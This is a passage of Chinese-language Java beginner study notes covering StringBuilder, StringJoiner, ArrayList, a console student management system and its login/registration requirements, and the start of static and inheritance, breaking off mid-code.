<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 基本使用</span></span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">sb.reverse();  <span class="comment">// 反转</span></span><br><span class="line"><span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> sb.length();  <span class="comment">// 获取长度</span></span><br><span class="line">System.out.println(len);  <span class="comment">// 并打印</span></span><br><span class="line">System.out.println(sb);  </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">因为StringBuilder是Java已经写好的类，java在底层对他做了一些特殊处理。</span></span><br><span class="line"><span class="comment">打印对象不是地址值而是属性值。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h4 id="链式编程"><a class="header-anchor" href="#链式编程">¶</a>链式编程</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 链式编程</span></span><br><span class="line"><span class="comment">// 1.创建对象</span></span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.添加字符串</span></span><br><span class="line">sb.append(<span class="string">&quot;aaa&quot;</span>).append(<span class="string">&quot;bbb&quot;</span>).append(<span class="string">&quot;ccc&quot;</span>).append(<span class="string">&quot;ddd&quot;</span>);</span><br><span class="line">System.out.println(sb);  <span class="comment">//aaabbbcccddd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.再把StringBuilder变回字符串</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> sb.toString();</span><br><span class="line">System.out.println(str);  <span class="comment">//aaabbbcccddd</span></span><br></pre></td></tr></table></figure>
<h4 id="练习：对称字符串"><a class="header-anchor" href="#练习：对称字符串">¶</a>练习：对称字符串</h4>
<ul>
<li>需求：键盘接受一个字符串，程序判断出该字符串是否是对称字符串，并在控制台打印是或不是</li>
<li>对称字符串：123321、111</li>
<li>非对称字符串：123123</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//使用StringBuilder的场景：</span></span><br><span class="line">    <span class="comment">//1.字符串的拼接</span></span><br><span class="line">    <span class="comment">//2.字符串的反转</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//1.键盘录入一个字符串</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入一个字符串&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> sc.next();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.反转键盘录入的字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>().append(str).reverse().toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.比较</span></span><br><span class="line">        <span class="keyword">if</span>(str.equals(result))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;当前字符串是对称字符串&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;当前字符串不是对称字符串&quot;</span>);</span><br></pre></td></tr></table></figure>
<h4 id="练习：拼接字符串"><a class="header-anchor" href="#练习：拼接字符串">¶</a>练习：拼接字符串</h4>
<ul>
<li>需求：定义一个方法，把 int 数组中的数据按照指定的格式拼接成一个字符串返回。调用该方法，并在控制台输出结果。</li>
<li>例如：数组为int[] arr = {1,2,3};
<ul>
<li>执行方法后的输出结果为：[1, 2, 3]</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main</span></span><br><span class="line"><span class="comment">//1.定义数组</span></span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.调用方法把数组变成字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> arrToString(arr);</span><br><span class="line"></span><br><span class="line">        System.out.println(str);</span><br><span class="line"></span><br><span class="line"><span class="comment">// arrToString</span></span><br><span class="line">		<span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        sb.append(<span class="string">&quot;[&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i == arr.length - <span class="number">1</span>)&#123;</span><br><span class="line">                sb.append(arr[i]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                sb.append(arr[i]).append(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sb.append(<span class="string">&quot;]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br></pre></td></tr></table></figure>
<h3 id="StringJoiner"><a class="header-anchor" href="#StringJoiner">¶</a>StringJoiner</h3>
<ul>
<li>StringJoiner跟StringBuilder一样，也可以看成是一个容器，创建之后里面的内容是可变的。</li>
<li>作用：提高字符串的操作效率，而且代码编写特别简洁，但是目前市场上很少有人用。</li>
<li>JDK8出现的</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 基本使用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.创建一个对象，并指定中间的间隔符号</span></span><br><span class="line"><span class="type">StringJoiner</span> <span class="variable">sj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringJoiner</span>(<span class="string">&quot;---&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.添加元素</span></span><br><span class="line">sj.add(<span class="string">&quot;aaa&quot;</span>).add(<span class="string">&quot;bbb&quot;</span>).add(<span class="string">&quot;ccc&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.打印结果</span></span><br><span class="line">System.out.println(sj);<span class="comment">//aaa---bbb---ccc</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.创建对象</span></span><br><span class="line"><span class="type">StringJoiner</span> <span class="variable">sj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringJoiner</span>(<span class="string">&quot;, &quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.添加元素</span></span><br><span class="line">sj.add(<span class="string">&quot;aaa&quot;</span>).add(<span class="string">&quot;bbb&quot;</span>).add(<span class="string">&quot;ccc&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> sj.length();</span><br><span class="line">System.out.println(len);<span class="comment">//15</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.打印</span></span><br><span class="line">System.out.println(sj);<span class="comment">//[aaa, bbb, ccc]</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> sj.toString();</span><br><span class="line">System.out.println(str);<span class="comment">//[aaa, bbb, ccc]</span></span><br></pre></td></tr></table></figure>
<h3 id="关于字符串的小扩展"><a class="header-anchor" href="#关于字符串的小扩展">¶</a>关于字符串的小扩展</h3>
<h4 id="字符串存储的内存原理"><a class="header-anchor" href="#字符串存储的内存原理">¶</a>字符串存储的内存原理</h4>
<ul>
<li>String s = “abc”；直接赋值
<ul>
<li>特点：
<ul>
<li>此时字符串abc是存在字符串常量池中的。</li>
<li>先检查字符串常量池中有没有字符串abc，如果有，不会创建新的，而是直接复用。如果没有abc，才会创建一个新的。</li>
<li>所以，直接赋值的方式，代码简单，而且节约内存。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="new出来的字符串"><a class="header-anchor" href="#new出来的字符串">¶</a>new出来的字符串</h4>
<ul>
<li>
<p>看到<strong>new</strong>关键字，一定是在<strong>堆里面开辟了一个小空间</strong>。</p>
</li>
<li>
<p>String s1 = new String（“abc”）；</p>
</li>
<li>
<p>String s2 = “abc”；</p>
</li>
<li>
<p>s1记录的是new出来的，在<strong>堆里面的地址值</strong>。</p>
</li>
<li>
<p>s2是直接赋值的，所以记录的是<strong>字符串常量池中的地址值</strong>。</p>
</li>
</ul>
<h4 id="号比较的是什么"><a class="header-anchor" href="#号比较的是什么">¶</a>==号比较的是什么</h4>
<ul>
<li>
<p>如果比较的是基本数据类型：比的是具体的数值是否相等。</p>
</li>
<li>
<p>如果比较的是引用数据类型：比 的是地址值是否相等。</p>
</li>
<li>
<p><strong>结论：</strong>==只能用于比较基本数据类型。不能比较引用数据类型。</p>
</li>
</ul>
<h2 id="Day11-集合-学生管理系统"><a class="header-anchor" href="#Day11-集合-学生管理系统">¶</a>Day11 集合&amp;学生管理系统</h2>
<h3 id="ArrayList"><a class="header-anchor" href="#ArrayList">¶</a>ArrayList</h3>
<ul>
<li><strong>集合和数组的优势对比：</strong></li>
</ul>
<ol>
<li>长度可变</li>
<li>添加数据的时候不需要考虑索引，默认将数据添加到末尾</li>
</ol>
<h4 id="构造"><a class="header-anchor" href="#构造">¶</a>构造</h4>
<p>public ArrayList()</p>
<h4 id="成员方法"><a class="header-anchor" href="#成员方法">¶</a>成员方法</h4>
<ul>
<li>
<p>public boolean add(要添加的元素)将指定的元素追加到此集合的末尾</p>
</li>
<li>
<p>public boolean remove(要删除的元素)删除指定元素,返回值表示是否删除成功</p>
</li>
<li>
<p>public E remove(int index)删除指定索引处的元素，返回被删除的元素</p>
</li>
<li>
<p>public E set(int index,E element)修改指定索引处的元素，返回被修改的元素</p>
</li>
<li>
<p>public E get(int index)返回指定索引处的元素</p>
</li>
<li>
<p>public int size()返回集合中的元素的个数</p>
</li>
</ul>
<h4 id="遍历"><a class="header-anchor" href="#遍历">¶</a>遍历</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">            <span class="comment">//i 依次表示集合里面的每一个索引</span></span><br><span class="line">            <span class="keyword">if</span>(i == list.size() - <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="comment">//最大索引</span></span><br><span class="line">                System.out.print(list.get(i));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//非最大索引</span></span><br><span class="line">                System.out.print(list.get(i) + <span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="案例：查找用户索引"><a class="header-anchor" href="#案例：查找用户索引">¶</a>案例：查找用户索引</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">//1.创建集合对象</span></span><br><span class="line">      ArrayList&lt;User&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">      <span class="comment">//2.创建用户对象</span></span><br><span class="line">      <span class="type">User</span> <span class="variable">u1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;heima001&quot;</span>, <span class="string">&quot;zhangsan&quot;</span>, <span class="string">&quot;123456&quot;</span>);</span><br><span class="line">      <span class="type">User</span> <span class="variable">u2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;heima002&quot;</span>, <span class="string">&quot;lisi&quot;</span>, <span class="string">&quot;1234&quot;</span>);</span><br><span class="line">      <span class="type">User</span> <span class="variable">u3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;heima003&quot;</span>, <span class="string">&quot;wangwu&quot;</span>, <span class="string">&quot;1234qwer&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//3.把用户对象添加到集合当中</span></span><br><span class="line">      list.add(u1);</span><br><span class="line">      list.add(u2);</span><br><span class="line">      list.add(u3);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//4.调用方法，通过id获取对应的索引</span></span><br><span class="line">      <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> getIndex(list, <span class="string">&quot;heima001&quot;</span>);</span><br><span class="line"></span><br><span class="line">      System.out.println(index);</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.我要干嘛？  根据id查找对应的学生信息</span></span><br><span class="line">  <span class="comment">//2.我干这件事情需要什么才能完成？   集合 id</span></span><br><span class="line">  <span class="comment">//3.方法的调用处是否需要继续使用方法的结果？</span></span><br><span class="line">  <span class="comment">//要用必须返回，不要用可以返回也可以不返回</span></span><br><span class="line">  <span class="comment">//明确说明需要有返回值 int</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getIndex</span><span class="params">(ArrayList&lt;User&gt; list, String id)</span> &#123;</span><br><span class="line">      <span class="comment">//遍历集合得到每一个元素</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">          <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> list.get(i);</span><br><span class="line">          <span class="type">String</span> <span class="variable">uid</span> <span class="operator">=</span> u.getId();</span><br><span class="line">          <span class="keyword">if</span>(uid.equals(id))&#123;</span><br><span class="line">              <span class="keyword">return</span> i;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//因为只有当集合里面所有的元素都比较完了，才能断定id是不存在的。</span></span><br><span class="line">      <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h3 id="学生管理系统"><a class="header-anchor" href="#学生管理系统">¶</a>学生管理系统</h3>
<ul>
<li>
<p>案例需求</p>
</li>
<li>
<p>综合案例：学生管理系统。该系统主要功能如下：</p>
<ul>
<li>添加学生：通过键盘录入学生信息，添加到集合中</li>
<li>删除学生：通过键盘录入要删除学生的学号，将该学生对象从集合中删除</li>
<li>修改学生：通过键盘录入要修改学生的学号，将该学生对象其他信息进行修改</li>
<li>查看学生：将集合中的学生对象信息进行展示</li>
<li>退出系统：结束程序</li>
</ul>
</li>
<li>
<p>实现步骤</p>
<ul>
<li>
<p>定义学生类，包含以下成员变量</p>
</li>
<li>
<p>​        private String sid            // 学生id</p>
</li>
<li>
<p>​        private String name       // 学生姓名</p>
</li>
<li>
<p>​        private String age          // 学生年龄</p>
</li>
<li>
<p>​        private String address   // 学生所在地</p>
</li>
<li>
<p>学生管理系统<strong>主界面</strong>的搭建步骤</p>
</li>
<li>
<ul>
<li>用输出语句完成主界面的编写 用Scanner实现键盘输入 用switch语句完成选择的功能 用循环完成功能结束后再次回到主界面</li>
</ul>
</li>
<li>
<p>学生管理系统的<strong>添加学生</strong>功能实现步骤</p>
</li>
<li>
<ul>
<li>定义一个方法，接收ArrayList<Student>集合 方法内完成添加学生的功能    ①键盘录入学生信息    ②根据录入的信息创建学生对象    ③将学生对象添加到集合中    ④提示添加成功信息 在添加学生的选项里调用添加学生的方法</Student></li>
</ul>
</li>
<li>
<p>学生管理系统的<strong>查看学生</strong>功能实现步骤</p>
</li>
<li>
<ul>
<li>定义一个方法，接收ArrayList<Student>集合 方法内遍历集合，将学生信息进行输出 在查看所有学生选项里调用查看学生方法</Student></li>
</ul>
</li>
<li>
<p>学生管理系统的删除学生功能实现步骤</p>
</li>
<li>
<ul>
<li>定义一个方法，接收ArrayList<Student>集合 方法中接收要删除学生的学号 遍历集合，获取每个学生对象 使用学生对象的学号和录入的要删除的学号进行比较,如果相同，则将当前学生对象从集合中删除 在删除学生选项里调用删除学生的方法</Student></li>
</ul>
</li>
<li>
<p>学生管理系统的修改学生功能实现步骤</p>
</li>
<li>
<ul>
<li>定义一个方法，接收ArrayList<Student>集合 方法中接收要修改学生的学号 通过键盘录入学生对象所需的信息，并创建对象 遍历集合，获取每一个学生对象。并和录入的修改学生学号进行比较.如果相同，则使用新学生对象替换当前学生对象 在修改学生选项里调用修改学生的方法</Student></li>
</ul>
</li>
<li>
<p>退出系统</p>
</li>
<li>
<ul>
<li>使用System.exit(0);退出JVM</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 选几处值得看的代码摘录</span></span><br><span class="line">	<span class="comment">// 菜单选择部分</span></span><br><span class="line">		<span class="keyword">switch</span> (choose) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;1&quot;</span> -&gt; addStudent(list);</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;2&quot;</span> -&gt; deleteStudent(list);</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;3&quot;</span> -&gt; updateStudent(list);</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;4&quot;</span> -&gt; queryStudent(list);</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;5&quot;</span> -&gt; &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;退出&quot;</span>);</span><br><span class="line">                    <span class="comment">//break loop;</span></span><br><span class="line">                    System.exit(<span class="number">0</span>);<span class="comment">//停止虚拟机运行</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">default</span> -&gt; System.out.println(<span class="string">&quot;没有这个选项&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 添加学生部分</span></span><br><span class="line">		<span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> contains(list, id);</span><br><span class="line">            <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">                <span class="comment">//表示id已经存在，需要重新录入</span></span><br><span class="line">                System.out.println(<span class="string">&quot;id已经存在，请重新录入&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//表示id不存在，表示可以使用</span></span><br><span class="line">                s.setId(id);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 删除学生部分</span></span><br><span class="line">		<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> getIndex(list, id);</span><br><span class="line">        <span class="comment">//对index进行判断</span></span><br><span class="line">        <span class="comment">//如果-1，就表示不存在，结束方法，回到初始菜单</span></span><br><span class="line">        <span class="keyword">if</span>(index &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">//如果大于等于0的，表示存在，直接删除</span></span><br><span class="line">            list.remove(index);</span><br><span class="line">            System.out.println(<span class="string">&quot;id为：&quot;</span> + id + <span class="string">&quot;的学生删除成功&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;id不存在，删除失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 修改学生信息部分</span></span><br><span class="line">		<span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> sc.next();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> getIndex(list, id);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index == -<span class="number">1</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;要修改的id&quot;</span> + id + <span class="string">&quot;不存在，请重新输入&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//当代码执行到这里，表示什么？表示当前id是存在的。</span></span><br><span class="line">        <span class="comment">//获取要修改的学生对象</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">stu</span> <span class="operator">=</span> list.get(index);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//输入其他的信息并修改</span></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入要修改的学生姓名&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">newName</span> <span class="operator">=</span> sc.next();</span><br><span class="line">        stu.setName(newName);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入要修改的学生年龄&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">newAge</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">        stu.setAge(newAge);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入要修改的学生家庭住址&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">newAddress</span> <span class="operator">=</span> sc.next();</span><br><span class="line">        stu.setAddress(newAddress);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;学生信息修改成功&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//判断id在集合中是否存在</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(ArrayList&lt;Student&gt; list, String id)</span> &#123;</span><br><span class="line">        <span class="comment">//循环遍历集合得到里面的每一个学生对象</span></span><br><span class="line">        <span class="comment">/*for (int i = 0; i &lt; list.size(); i++) &#123;</span></span><br><span class="line"><span class="comment">            //拿到学生对象后，获取id并进行判断</span></span><br><span class="line"><span class="comment">            Student stu = list.get(i);</span></span><br><span class="line"><span class="comment">            String sid = stu.getId();</span></span><br><span class="line"><span class="comment">            if(sid.equals(id))&#123;</span></span><br><span class="line"><span class="comment">                //存在，true</span></span><br><span class="line"><span class="comment">                return true;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        // 不存在false</span></span><br><span class="line"><span class="comment">        return false;*/</span></span><br><span class="line">       <span class="keyword">return</span> getIndex(list,id) &gt;= <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//通过id获取索引的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getIndex</span><span class="params">(ArrayList&lt;Student&gt; list, String id)</span>&#123;</span><br><span class="line">        <span class="comment">//遍历集合</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">            <span class="comment">//得到每一个学生对象</span></span><br><span class="line">            <span class="type">Student</span> <span class="variable">stu</span> <span class="operator">=</span> list.get(i);</span><br><span class="line">            <span class="comment">//得到每一个学生对象的id</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">sid</span> <span class="operator">=</span> stu.getId();</span><br><span class="line">            <span class="comment">//拿着集合中的学生id跟要查询的id进行比较</span></span><br><span class="line">            <span class="keyword">if</span>(sid.equals(id))&#123;</span><br><span class="line">                <span class="comment">//如果一样，那么就返回索引</span></span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//当循环结束之后还没有找到，就表示不存在，返回-1.</span></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Day12-学生管理系统升级版"><a class="header-anchor" href="#Day12-学生管理系统升级版">¶</a>Day12 学生管理系统升级版</h2>
<h3 id="需求文档←"><a class="header-anchor" href="#需求文档←">¶</a>需求文档←</h3>
<ul>
<li>需求
<ul>
<li>为学生管理系统书写一个登陆、注册、忘记密码的功能。</li>
<li>只有用户登录成功之后，才能进入到学生管理系统中进行增删改查操作。</li>
</ul>
</li>
</ul>
<h4 id="登录界面："><a class="header-anchor" href="#登录界面：">¶</a><strong>登录界面：</strong></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(<span class="string">&quot;欢迎来到学生管理系统&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;请选择操作1登录 2注册 3忘记密码&quot;</span>);</span><br></pre></td></tr></table></figure>
<h4 id="用户类："><a class="header-anchor" href="#用户类：">¶</a><strong>用户类：</strong></h4>
<p>属性：用户名、密码、身份证号码、手机号码</p>
<h4 id="注册功能："><a class="header-anchor" href="#注册功能：">¶</a><strong>注册功能：</strong></h4>
<ol>
<li><strong>用户名</strong>需要满足以下要求：</li>
</ol>
<ul>
<li>验证要求：
<ul>
<li>用户名唯一</li>
<li>用户名长度必须在3~15位之间</li>
<li>只能是字母加数字的组合，但是不能是纯数字</li>
</ul>
</li>
</ul>
<ol start="2">
<li>
<p>密码键盘输入两次，两次一致才可以进行注册。</p>
</li>
<li>
<p>身份证号码需要验证。</p>
</li>
</ol>
<p>验证要求：</p>
<p>长度为18位</p>
<p>不能以0为开头</p>
<p>前17位，必须都是数字</p>
<p>最后一位可以是数字，也可以是大写X或小写x</p>
<ol start="4">
<li>手机号验证。</li>
</ol>
<p>验证要求：</p>
<p>长度为11位</p>
<p>不能以0为开头</p>
<p>必须都是数字</p>
<h4 id="登录功能："><a class="header-anchor" href="#登录功能：">¶</a><strong>登录功能：</strong></h4>
<ol>
<li>键盘录入用户名</li>
<li>键盘录入密码</li>
<li>键盘录入验证码</li>
</ol>
<p>验证要求：</p>
<p>用户名如果未注册，直接结束方法，并提示：用户名未注册，请先注册</p>
<p>判断验证码是否正确，如不正确，重新输入</p>
<p>再判断用户名和密码是否正确，有3次机会</p>
<h4 id="忘记密码："><a class="header-anchor" href="#忘记密码：">¶</a><strong>忘记密码：</strong></h4>
<ol>
<li>键盘录入用户名，判断当前用户名是否存在，如不存在，直接结束方法，并提示：未注册</li>
<li>键盘录入身份证号码和手机号码</li>
<li>判断当前用户的身份证号码和手机号码是否一致，
<ol>
<li>
<p>如果一致，则提示输入密码，进行修改。</p>
</li>
<li>
<p>如果不一致，则提示：账号信息不匹配，修改失败。</p>
</li>
</ol>
</li>
</ol>
<h4 id="验证码规则："><a class="header-anchor" href="#验证码规则：">¶</a><strong>验证码规则：</strong></h4>
<ol>
<li>长度为5</li>
<li>由4位大写或者小写字母和1位数字组成，同一个字母可重复</li>
<li>数字可以出现在任意位置</li>
</ol>
<p>比如：aQa1K</p>
<h2 id="Day13-面向对象进阶（static-继承）"><a class="header-anchor" href="#Day13-面向对象进阶（static-继承）">¶</a>Day13 面向对象进阶（static&amp;继承）</h2>
<h3 id="学习目标"><a class="header-anchor" href="#学习目标">¶</a><strong>学习目标</strong></h3>
<ul>
<li>能够掌握static关键字修饰的变量调用方式</li>
<li>能够掌握static关键字修饰的方法调用方式</li>
<li>知道静态代码块的格式和应用场景</li>
<li>能够写出类的继承格式</li>
<li>能够说出继承的特点</li>
<li>能够区分this和super的作用</li>
<li>能够说出方法重写的概念</li>
<li>能够说出方法重写的注意事项</li>
</ul>
<h3 id="封装-v2"><a class="header-anchor" href="#封装-v2">¶</a>封装</h3>
<ol>
<li>使用 <code>private</code> 关键字来修饰成员变量。</li>
<li>使用<code>public</code>修饰getter和setter方法</li>
</ol>
<h3 id="static"><a class="header-anchor" href="#static">¶</a>static</h3>
<ul>
<li>有static修饰成员变量，说明这个成员变量是属于类的，这个成员变量称为<strong>类变量</strong>或者<strong>静态成员变量</strong>。 直接用  类名访问即可。因为类只有一个，所以静态成员变量在内存区域中也只存在一份。所有的对象都可以共享这个变量</li>
<li>与静态成员变量一样，静态方法也是直接通过<strong>类名.方法名称</strong>即可访问</li>
</ul>
<h3 id="继承"><a class="header-anchor" href="#继承">¶</a>继承</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">class 父类 &#123;...&#125;</span><br><span class="line"></span><br><span class="line">class 子类 extends 父类 &#123;...&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：<strong>Java是单继承的，一个类只能继承一个直接父类</strong>，跟现实世界很像，但是Java中的子类是更加强大的</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 有点忘了细节所以记一下</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 父类Human类</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Human</span> &#123;</span><br><span class="line">    <span class="comment">// 合理隐藏</span></span><br><span class="line">    <span class="keyword">private</span> String name ;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age ;</span><br><span class="line">    <span class="comment">// 合理暴露</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span 